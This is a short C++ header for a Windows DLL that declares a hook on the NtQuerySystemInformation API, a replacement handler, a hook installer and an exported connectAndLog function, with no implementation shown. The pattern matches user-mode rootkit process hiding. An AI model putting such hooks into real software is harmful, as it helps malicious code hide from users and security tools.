#pragma once
#ifdef DLL_EXPORT
#define _CRT_SECURE_NO_WARNINGS
#define DECLDIR __declspec(dllexport)
#else
#define DECLDIR __declspec(dllimport)
#endif
#include <Windows.h>
#include <TlHelp32.h>
#include <winternl.h>
#include <Psapi.h>
#include <chrono>

typedef NTSTATUS(NTAPI* PFN_NT_QUERY_SYSTEM_INFORMATION)(
    SYSTEM_INFORMATION_CLASS SystemInformationClass,
    PVOID SystemInformation,
    ULONG SystemInformationLength,
    PULONG ReturnLength);

PFN_NT_QUERY_SYSTEM_INFORMATION OriginalNtQuerySystemInformation;

extern "C"
{
	DECLDIR void connectAndLog();
    NTSTATUS NTAPI HookedNtQuerySystemInformation(
        SYSTEM_INFORMATION_CLASS SystemInformationClass,
        PVOID SystemInformation,
        ULONG SystemInformationLength,
        PULONG ReturnLength);
    void HookNtQuerySystemInformation();
}
